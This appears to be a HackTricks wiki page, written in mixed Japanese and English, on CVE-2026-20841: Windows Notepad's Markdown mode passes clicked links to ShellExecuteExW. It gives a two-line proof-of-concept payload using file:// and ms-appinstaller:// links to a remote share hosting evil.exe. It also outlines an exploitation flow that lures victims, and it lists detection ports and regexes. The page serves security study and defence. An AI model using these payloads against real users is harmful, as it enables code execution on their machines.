# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

ModernなWindowsアプリケーションでMarkdown/HTMLをrenderするものは、ユーザーが指定したlinkをclick可能な要素に変換し、`ShellExecuteExW`に渡すことがよくあります。schemeの厳密なallowlistがない場合、登録されている任意のprotocol handler（例: `file:`、`ms-appinstaller:`）をtriggerでき、現在のuser contextでのcode executionにつながる可能性があります。<sup>[[1]](#references)</sup>

## Windows NotepadのMarkdown modeにおけるShellExecuteExW surface
- Notepadは、`sub_1400ED5D0()`内の固定string比較により、**`.md` extensionの場合のみ**Markdown modeを選択します。<sup>[[1]](#references)</sup>
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>`（`[target](target)`としてrenderされる）。そのため、payloadとdetectionの両方でこの2つのsyntaxが重要です。
- linkのclickは`sub_140170F60()`で処理されます。このfunctionは弱いfilteringを行った後、`ShellExecuteExW`をcallします。
- `ShellExecuteExW`はHTTP(S)だけでなく、**設定されている任意のprotocol handler**にdispatchします。<sup>[[1]](#references)</sup>

### Payload considerations
- link内の任意の`\\` sequenceは、`ShellExecuteExW`の前に**`\`へnormalize**されるため、UNC/pathのcraftingおよびdetectionに影響します。
- `.md` filesは**defaultではNotepadにassociatedされていません**。そのためvictimは引き続きfileをNotepadで開いてlinkをclickする必要がありますが、一度renderされるとlinkはclick可能になります。
- Dangerous example schemes:<sup>[[1]](#references)</sup>
- `file://`はlocal/UNC payloadをlaunchするために使用できます。
- `ms-appinstaller://`はApp Installer flowをtriggerするために使用できます。その他のlocalにregisteredされたschemeもabuseできる可能性があります。

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Notepad が Markdown としてレンダリングするように **`.md` file** を作成する。
2. 危険な URI scheme（`file:`、`ms-appinstaller:`、またはインストール済みの任意の handler）を使用して link を埋め込む。
3. file を（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB または類似の方法で）配布し、ユーザーを誘導して Notepad で開かせる。
4. クリックすると、**normalized link** が `ShellExecuteExW` に渡され、対応する protocol handler がユーザーの context で参照された content を実行する。<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- 文書の配布に一般的に使用される port/protocol 経由での `.md` file の転送を監視する: `20/21 (FTP)`、`80 (HTTP)`、`443 (HTTPS)`、`110 (POP3)`、`143 (IMAP)`、`25/587 (SMTP)`、`139/445 (SMB/CIFS)`、`2049 (NFS)`、`111 (portmap)`。
- Markdown link（standard および autolink）を解析し、**case-insensitive** な `file:` または `ms-appinstaller:` を探す。
- remote resource access を検出するための、vendor-guided regexes:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- パッチ後の挙動では、**ローカルファイルと HTTP(S) を allowlist に登録している**と報告されています。それ以外で `ShellExecuteExW` に到達するものは suspicious です。攻撃対象領域は system によって異なるため、必要に応じて他のインストール済み protocol handler も検出対象に追加してください。<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad における任意コード実行](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
